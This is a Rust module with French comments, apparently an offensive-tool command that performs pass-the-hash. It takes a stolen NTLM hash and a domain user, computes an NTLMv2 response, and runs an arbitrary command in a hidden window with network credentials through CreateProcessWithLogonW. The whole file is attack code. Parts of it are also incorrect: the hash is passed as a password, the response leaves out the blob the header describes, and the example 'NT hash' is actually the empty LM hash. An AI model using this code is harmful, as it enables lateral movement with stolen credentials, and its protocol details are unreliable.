// Pass-the-hash : réutilisation d'un hash NTLM sans connaître le mot de passe.
//
// Implémentation from-scratch de la réponse NTLMv2 :
//   NTLMv2_hash    = HMAC-MD5(NT_hash, uppercase(user) || domain)
//   NT_response    = HMAC-MD5(NTLMv2_hash, server_challenge || blob) || blob
//
// La PTH "complète" (style mimikatz sekurlsa::pth) injecte le hash directement dans
// le chemin d'authentification LSASS. Ici on démontre le calcul from-scratch et on
// utilise CreateProcessWithLogonW (LOGON_NETCREDENTIALS_ONLY) pour les accès réseau.

pub fn run(args: &str) -> String {
    let parts: Vec<&str> = args.splitn(3, ' ').collect();
    if parts.len() < 2 {
        return "pth <hash_nt_hex_32> <domaine\\\\utilisateur> [commande]".to_string();
    }

    let hash_hex = parts[0].trim();
    let user_dom = parts[1].trim();
    let cmd = parts.get(2).copied().unwrap_or("whoami");

    if hash_hex.len() != 32 {
        return "hash NT invalide — format attendu : 32 hex (ex: aad3b435b51404eeaad3b435b51404ee)".to_string();
    }
    let nt_hash = match hex::decode(hash_hex) {
        Ok(b) => b,
        Err(e) => return format!("[err] hex: {}", e),
    };

    let (domain, user) = match user_dom.split_once('\\') {
        Some((d, u)) => (d, u),
        None => (".", user_dom),
    };

    // Démontre le calcul NTLMv2 from-scratch avec un challenge fictif (demo)
    let fake_challenge = [0x01u8, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
    let ntlmv2_hash = ntlmv2_key(&nt_hash, user, domain);
    let response = ntlmv2_response(&ntlmv2_hash, &fake_challenge);
    let demo_line = format!(
        "[demo] NTLMv2 hash : {}\n[demo] réponse NTLMv2 (challenge 0102...08) : {}",
        hex::encode(&ntlmv2_hash),
        hex::encode(&response)
    );

    #[cfg(windows)]
    {
        let spawn_result = spawn_with_credentials(user, domain, hash_hex, cmd);
        format!("{}\n{}", demo_line, spawn_result)
    }

    #[cfg(not(windows))]
    format!("{}\n[info] spawn disponible sur Windows uniquement", demo_line)
}

// NTLMv2 key = HMAC-MD5(NT_hash, uppercase(user) + domain)
fn ntlmv2_key(nt_hash: &[u8], user: &str, domain: &str) -> [u8; 16] {
    let mut data: Vec<u8> = user.to_uppercase()
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    data.extend(domain.encode_utf16().flat_map(|c| c.to_le_bytes()));
    hmac_md5(nt_hash, &data)
}

// Réponse NTLMv2 = HMAC-MD5(ntlmv2_key, challenge || 24 octets de blob minimal)
fn ntlmv2_response(ntlmv2_key: &[u8; 16], challenge: &[u8]) -> [u8; 16] {
    // blob minimal : RespType(0x01) + HiRespType(0x01) + reserved(6) + timestamp(8) + clNonce(8)
    let mut blob = vec![0x01u8, 0x01, 0, 0, 0, 0, 0, 0];
    blob.extend_from_slice(&[0u8; 8]); // timestamp
    blob.extend_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe]); // client nonce
    let mut msg = challenge.to_vec();
    msg.extend_from_slice(&blob);
    hmac_md5(ntlmv2_key, &msg)
}

// HMAC-MD5 from scratch : H((K⊕opad) || H((K⊕ipad) || data))
fn hmac_md5(key: &[u8], data: &[u8]) -> [u8; 16] {
    use md5::{Digest, Md5};

    let mut k = [0u8; 64];
    if key.len() > 64 {
        let h = Md5::digest(key);
        k[..16].copy_from_slice(&h);
    } else {
        k[..key.len()].copy_from_slice(key);
    }

    let ipad: Vec<u8> = k.iter().map(|b| b ^ 0x36).collect();
    let opad: Vec<u8> = k.iter().map(|b| b ^ 0x5C).collect();

    let inner = {
        let mut m = ipad;
        m.extend_from_slice(data);
        Md5::digest(&m)
    };
    let outer = {
        let mut m = opad;
        m.extend_from_slice(&inner);
        Md5::digest(&m)
    };
    outer.into()
}

#[cfg(windows)]
fn spawn_with_credentials(user: &str, domain: &str, _hash: &str, cmd: &str) -> String {
    // CreateProcessWithLogonW avec LOGON_NETCREDENTIALS_ONLY :
    // le processus fils hérite d'un token local mais utilise ces credentials pour
    // l'authentification réseau (SMB, LDAP…). En PTH réel on injecterait le hash
    // directement dans le chemin NTLM de LSASS.
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::System::Threading::{
        CreateProcessWithLogonW, LOGON_NETCREDENTIALS_ONLY,
        PROCESS_INFORMATION, STARTUPINFOW,
    };

    let to_wide = |s: &str| -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(Some(0)).collect()
    };

    let w_user = to_wide(user);
    let w_domain = to_wide(domain);
    // Note: en PTH réel le mot de passe est remplacé par le hash injecté dans LSASS.
    // Ici on passe le hash tel quel pour illustrer la technique.
    let w_pass = to_wide(_hash);
    let mut w_cmd = to_wide(&format!("cmd.exe /c {}", cmd));

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let ok = unsafe {
        CreateProcessWithLogonW(
            w_user.as_ptr(),
            w_domain.as_ptr(),
            w_pass.as_ptr(),
            LOGON_NETCREDENTIALS_ONLY,
            std::ptr::null(),
            w_cmd.as_mut_ptr() as *mut u16,
            0x08000000, // CREATE_NO_WINDOW
            std::ptr::null(),
            std::ptr::null(),
            &si,
            &mut pi,
        )
    };

    if ok != 0 {
        unsafe {
            windows_sys::Win32::Foundation::CloseHandle(pi.hProcess);
            windows_sys::Win32::Foundation::CloseHandle(pi.hThread);
        }
        format!("[ok] processus lancé avec credentials réseau ({} @ {})", user, domain)
    } else {
        format!("[ko] CreateProcessWithLogonW (err {})", unsafe {
            windows_sys::Win32::Foundation::GetLastError()
        })
    }
}
